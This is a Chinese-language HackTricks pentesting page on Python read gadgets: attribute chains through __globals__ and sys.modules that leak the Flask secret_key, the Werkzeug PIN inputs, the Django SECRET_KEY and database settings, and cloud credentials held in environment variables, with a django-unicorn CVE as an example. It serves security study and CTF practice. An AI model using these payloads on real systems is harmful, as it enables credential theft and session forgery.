# Python 内部读取 Gadgets

{{#include ../../banners/hacktricks-training.md}}

## 基本信息

不同的漏洞，例如 [**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) 或 [**Class Pollution**](class-pollution-pythons-prototype-pollution.md) 可能允许你 **读取 python 的内部数据，但不能执行代码**。因此，pentester 需要充分利用这些读取权限来 **获取敏感权限并提升漏洞影响**。

### Flask - 读取 secret key

Flask 应用的主页面通常会有 **`app`** 全局对象，**secret 已在此配置**。
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
在这种情况下，仅需使用任何 gadget 就可以从 [**Bypass Python sandboxes page**](bypass-python-sandboxes/index.html) **access global objects** 来访问该对象。

如果漏洞存在于不同的 python 文件中，你需要一个 gadget 来遍历文件以到达主文件，从而 **access the global object `app.secret_key`** 以更改 Flask secret key 并能够 [**escalate privileges** knowing this key](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign)。

像这样的 payload [from this writeup](https://ctftime.org/writeup/36082):
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
使用这个 payload 来 **更改 `app.secret_key`**（你应用中的名称可能不同），以便能够签名新的、权限更高的 flask cookies。

### Werkzeug - machine_id 和 node uuid

[**Using these payload from this writeup**](https://vozec.fr/writeups/tweedle-dum-dee/) 你将能够访问 **machine_id** 和 **uuid** 节点，它们是你需要用来 [**generate the Werkzeug pin**](../../network-services-pentesting/pentesting-web/werkzeug.md) 的 **main secrets**，该 pin 可在 **debug mode** 启用时用于访问 `/console` 中的 python console：
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> 注意，你可以通过在网页上触发某些 **错误** 来获取 **服务器上 `app.py` 的本地路径**，该错误页面会 **给你该路径**。

如果漏洞存在于不同的 python 文件中，请查看前面的 Flask 技巧，以从主 python 文件访问对象。

### Django - SECRET_KEY 和 settings 模块

Django 的 settings 对象在应用启动后会被缓存到 `sys.modules`。仅凭 read primitives 你可以 leak **`SECRET_KEY`**、数据库凭证或签名盐：
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.DATABASES, a.SIGNING_BACKEND)
```
如果易受攻击的 gadget 在另一个模块中，先遍历 globals：
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
一旦密钥已知，你可以以类似于对 Flask 的方式伪造 Django 签名的 cookies 或 tokens。

### 环境变量 / cloud creds via loaded modules

许多 jail 仍在某处导入 `os` 或 `sys`。你可以滥用任何可达函数的 `__init__.__globals__` 来切换到已导入的 `os` 模块并导出包含 API tokens、cloud keys 或 flags 的 **环境变量**：
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
如果子类索引被过滤，使用 loaders：
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
环境变量经常是将访问从 read 升级到 full compromise 所需的唯一 secrets（cloud IAM keys、database URLs、signing keys 等）。

### Django-Unicorn class pollution (CVE-2025-24370)

`django-unicorn` (<0.62.0) 允许通过精心构造的组件请求导致 **class pollution**。设置像 `__init__.__globals__` 这样的属性路径可以让攻击者访问组件模块的全局命名空间以及任何已导入的模块（例如 `settings`、`os`、`sys`）。从那里你可以 leak `SECRET_KEY`、`DATABASES` 或服务凭据，而无需代码执行。该利用链纯粹是 read-based 的，并使用与上文相同的 dunder-gadget 模式。

### Gadget collections for chaining

最近的 CTF（例如 jailCTF 2025）表明可以仅通过属性访问和子类枚举构建可靠的 read chains。社区维护的列表，例如 [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker)，收录了数百个可组合的最小 gadgets，用于从对象遍历到 `__globals__`、`sys.modules`，并最终获取敏感数据。当索引或类名在 Python 次版之间有所不同时，使用它们可以快速适配。

## References

- [Wiz analysis of django-unicorn class pollution (CVE-2025-24370)](https://www.wiz.io/vulnerability-database/cve/cve-2025-24370)
- [pyjailbreaker – Python sandbox gadget wiki](https://github.com/jailctf/pyjailbreaker)
{{#include ../../banners/hacktricks-training.md}}
